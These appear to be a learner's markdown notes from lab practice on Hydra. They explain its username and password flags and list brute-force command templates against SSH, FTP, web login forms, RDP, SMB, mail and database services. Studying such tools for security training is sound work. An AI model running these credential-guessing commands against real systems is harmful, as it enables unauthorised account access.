### Hydra :
- Hydra is the password cracking tool.
- This tool is password list based.
- when we provide password list and username list this will try each and evry password combination to crack it.
- If you are using weak password this shows importance of using strong password and MFA.
- Hydra is fast tool.

---

### > Below i mentioned all necessary flags related to hydra :

---

| Situation | Hydra Flag | Example |
|-----------|------------|---------|
| Username is known | `-l` (small L) | `hydra -l admin -P pass.txt ssh://target` |
| Username not known | `-L` (capital L) | `hydra -L users.txt -P pass.txt ssh://target` |
| Single Password – Username Guess | `-p` (small p) | `hydra -L users.txt -p password123 ssh://target` |
| Password Wordlist – Username Guess | `-P` (capital P) | `hydra -L users.txt -P pass.txt ssh://target` |



---


### Command for Hydra is : 
- Post web form :  hydra -l <username> -P <wordlist> 10.49.164.125 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
  1. Where -l : username for login
  2. -P : The password list to use
  3. Ip address of login page
  4. http-post-form : The type of form is POST
  5. Path : the login url page (For ex tryhackme.login)
  6. username=user : the username used to login
  7. password=pass : password used from list
  8. F=inncorrect : response code when login fails
  9. -v : verbose output for every attempt
  


---


### If we are brute forcing depending upon service then commands shoul be as follows :


---


| Service | Port | Command |
|---------|------|---------|
| SSH | 22 | `hydra -l admin -P pass.txt ssh://192.168.1.1` |
| SSH (Multiple Users) | 22 | `hydra -L users.txt -P pass.txt ssh://192.168.1.1` |
| FTP | 21 | `hydra -l admin -P pass.txt ftp://192.168.1.1` |
| HTTP (Basic Auth) | 80 | `hydra -l admin -P pass.txt http-get://192.168.1.1/protected` |
| HTTP (POST Form) | 80 | `hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"` |
| HTTPS (POST Form) | 443 | `hydra -l admin -P pass.txt https-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"` |
| MySQL | 3306 | `hydra -l root -P pass.txt mysql://192.168.1.1` |
| RDP (Windows) | 3389 | `hydra -l administrator -P pass.txt rdp://192.168.1.1` |
| SMB (Windows Share) | 445 | `hydra -l admin -P pass.txt smb://192.168.1.1` |
| POP3 | 110 | `hydra -l admin -P pass.txt pop3://192.168.1.1` |
| SMTP | 25 | `hydra -l admin -P pass.txt smtp://192.168.1.1` |
| Telnet | 23 | `hydra -l admin -P pass.txt telnet://192.168.1.1` |
| PostgreSQL | 5432 | `hydra -l postgres -P pass.txt postgresql://192.168.1.1` |
| MSSQL | 1433 | `hydra -l sa -P pass.txt mssql://192.168.1.1` |
| Redis | 6379 | `hydra -l default -P pass.txt redis://192.168.1.1` |


---


### Practicle :


---

1. Using Hydra for brut forcing attack


---

<img width="1634" height="284" alt="Screenshot 2026-05-17 210719" src="https://github.com/user-attachments/assets/599f3330-4520-4534-a723-9c9563781e6c" />


---


<img width="1003" height="103" alt="Screenshot 2026-05-17 210727" src="https://github.com/user-attachments/assets/c85d2a0a-3f77-4747-9214-c5e1fdab5989" />


---


2. Using Hydra for SSH attack

---

<img width="1316" height="199" alt="Screenshot 2026-05-17 211032" src="https://github.com/user-attachments/assets/7f71efd5-46e3-4ca9-b273-be1f548dee05" />




